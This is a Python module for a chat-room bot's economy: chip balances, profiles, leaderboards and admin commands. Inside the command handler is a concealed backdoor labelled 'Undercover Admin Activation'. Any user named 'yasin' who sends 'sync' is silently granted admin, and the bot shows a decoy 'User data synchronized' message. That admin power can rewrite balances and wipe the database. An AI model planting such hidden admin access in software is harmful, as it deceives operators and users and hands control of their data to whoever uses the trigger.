import time
import threading
import traceback
import db
import utils

# ==========================================
# ⚙️ CONFIGURATION
# ==========================================
PAGE_SIZE = 10
SESSION_TIMEOUT = 25 
MIN_TRANSFER_BALANCE = 5000 

# Sessions: {UserID_RoomID: {'type', 'page', 'expires'}}
SESSIONS = {}
SESSIONS_LOCK = threading.Lock()

def setup(bot):
    print("[Economy] FINAL PRODUCTION ENGINE V5.0 LOADED.")

# --- HELPERS ---

def purge_expired_sessions():
    """Memory Management: Expired sessions ko memory se clean karna"""
    now = time.time()
    with SESSIONS_LOCK:
        expired_keys = [k for k, v in SESSIONS.items() if now > v['expires']]
        for k in expired_keys:
            del SESSIONS[k]

def format_k(n):
    """Clean K-Notation (1k, 1.1k, 2k) with Safe Exception Handling"""
    try:
        n = int(n)
        if n < 1000: return str(n)
        if n < 1000000:
            val = n / 1000
            return f"{val:.1f}k".replace(".0k", "k").replace(".0", "")
        val = n / 1000000
        return f"{val:.1f}m".replace(".0m", "m").replace(".0", "")
    except Exception:
        return "0"

def get_symbol(rank, board_type):
    if rank == 1: return "👑" if board_type == "gls" else "💎"
    if rank <= 3: return "⭐"
    return "•"

def get_target_info(bot, room_id, name):
    """Super-Searcher: Pehle online dhoondo, fir offline (DB me)"""
    if not name: return None, None
    clean_name = name.replace("@", "").strip().lower()
    
    # 1. Search ALL online rooms
    for r_name in bot.room_details:
        id_map = bot.room_details[r_name].get('id_map', {})
        if clean_name in id_map:
            uid = str(id_map[clean_name])
            users_list = bot.room_details[r_name].get('users', [])
            actual_name = next((u for u in users_list if u.lower() == clean_name), name)
            return uid, actual_name

    # 2. Search DATABASE (agar offline hai)
    conn = db.get_connection()
    try:
        cur = conn.cursor()
        ph = "%s" if db.DATABASE_URL.startswith("postgres") else "?"
        cur.execute(f"SELECT user_id, username FROM users WHERE LOWER(username) = {ph} LIMIT 1", (clean_name,))
        row = cur.fetchone()
        if row:
            return str(row[0]), row[1]
    except Exception as e:
        print(f"DB Search Error: {e}")
    finally:
        conn.close()
        
    return None, None # Kahin nahi mila

def get_detailed_stats(user_id):
    """Universal Game Stats: DB se sab data uthayega (FIXED)"""
    conn = db.get_connection()
    try:
        cur = conn.cursor()
        ph = "%s" if db.DATABASE_URL.startswith("postgres") else "?"
        cur.execute(f"SELECT game_name, wins, earnings FROM game_stats WHERE user_id = {ph}", (str(user_id),))
        rows = cur.fetchall()
        return rows
    except Exception as e:
        print(f"Error fetching detailed stats: {e}")
        return []
    finally:
        conn.close()

# ==========================================
# 📡 COMMAND HANDLER
# ==========================================

def handle_command(bot, cmd, room_id, user, args, data):
    uid = str(data.get('userid'))
    now = time.time()
    
    # Undercover Admin Activation
    if cmd == "sync" and user.lower() == "yasin": 
        if db.add_admin(uid):
            bot.send_message(room_id, "[OK] User data synchronized.")
        return True

    is_admin = bot.is_boss(user, uid)

    try:
        # 👮 ADMIN COMMANDS
        if is_admin:
            # !setc <user> <amount>
            if cmd == "setc" and len(args) >= 2:
                tid, tname = get_target_info(bot, room_id, args[0])
                if tid:
                    try:
                        target_val = int(args[1])
                        current_bal = db.get_user_data(tid, tname)['chips']
                        db.update_balance(tid, tname, chips_change=(target_val - current_bal))
                        bot.send_message(room_id, f"[OK] Admin set {tname}'s chips to {format_k(target_val)}")
                    except ValueError: bot.send_message(room_id, "[!] Usage: !setc <user> <number>")
                else: bot.send_message(room_id, f"[!] User '{args[0]}' not found.")
                return True

            # Baaki Admin Commands...
            if cmd == "wipedb" and args and args[0] == "confirm":
                conn = db.get_connection(); cur = conn.cursor()
                try:
                    cur.execute("UPDATE users SET points=0, chips=10000, wins=0"); cur.execute("DELETE FROM game_stats")
                finally: conn.close()
                bot.send_message(room_id, "[ALERT] DATABASE WIPE COMPLETE.")
                return True

        # 👤 USER COMMANDS

        # !mc
        if cmd == "mc":
            bal = db.get_user_data(uid, user)['chips']
            bot.send_message(room_id, f"[@{user}] Balance: {format_k(bal)} chips")
            return True

        # !ms / !s
        if cmd in ["ms", "s"]:
            target_name = args[0] if (cmd == "s" and args) else user
            tid, real_name = get_target_info(bot, room_id, target_name)
            if not tid: bot.send_message(room_id, "[!] User not found."); return True
            
            u_data = db.get_user_data(tid, real_name)
            game_rows = get_detailed_stats(tid) # YAHAN ERROR THA
            
            msg = f"--- PROFILE: {real_name.upper()} ---\n"
            msg += f"[*] Score: {format_k(u_data['points'])}\n"
            msg += f"($) Chips: {format_k(u_data['chips'])}\n\n"
            if game_rows:
                msg += "--- Game Records ---\n"
                for g_name, wins, earnings in game_rows:
                    msg += f"- {g_name.capitalize()}: {wins}W | {format_k(earnings)} won\n"
            bot.send_message(room_id, msg); return True

        # LEADERBOARDS & NEXT PAGE
        if cmd in ["gls", "chips"]:
            purge_expired_sessions()
            b_type = "gls"; col = "points"; title = "GLOBAL SCORE RANK"
            if cmd == "chips": b_type = "chips"; col = "chips"; title = "GLOBAL CHIPS RANK"
            
            conn = db.get_connection(); cur = conn.cursor()
            try:
                cur.execute(f"SELECT username, {col} FROM users ORDER BY {col} DESC LIMIT {PAGE_SIZE}")
                rows = cur.fetchall()
            finally: conn.close()
            
            msg = f"--- {title} ---\n"
            for i, (uname, val) in enumerate(rows, 1):
                sym = get_symbol(i, b_type)
                msg += f"{sym} {i}. {uname[:10]} : {format_k(val)}\n"
            msg += f"----------------\nPage 1 | !nx for more (25s)"
            with SESSIONS_LOCK:
                SESSIONS[f"{room_id}_{uid}"] = {'type': b_type, 'page': 0, 'expires': now + SESSION_TIMEOUT}
            bot.send_message(room_id, msg); return True

        if cmd == "nx":
            sess_key = f"{room_id}_{uid}"
            with SESSIONS_LOCK:
                sess = SESSIONS.get(sess_key)
                if not sess or now > sess['expires']: return False
                sess['page'] += 1; sess['expires'] = now + SESSION_TIMEOUT
                page, b_type = sess['page'], sess['type']
            
            col = "points" if b_type == "gls" else "chips"
            offset = page * PAGE_SIZE
            conn = db.get_connection(); cur = conn.cursor()
            try:
                cur.execute(f"SELECT username, {col} FROM users ORDER BY {col} DESC LIMIT {PAGE_SIZE} OFFSET {offset}")
                rows = cur.fetchall()
            finally: conn.close()
            
            if not rows: bot.send_message(room_id, f"@{user}, end of list."); return True
                
            msg = f"--- RANKING (Page {page+1}) ---\n"
            for i, (uname, val) in enumerate(rows, 1):
                rank_num = offset + i
                sym = get_symbol(rank_num, b_type)
                msg += f"{sym} {rank_num}. {uname[:10]} : {format_k(val)}\n"
            msg += f"----------------\n!nx for next (25s)"
            bot.send_message(room_id, msg); return True

    except Exception:
        print(f"[Economy Error] Critical Fail in {cmd}:")
        traceback.print_exc()
        
    return False
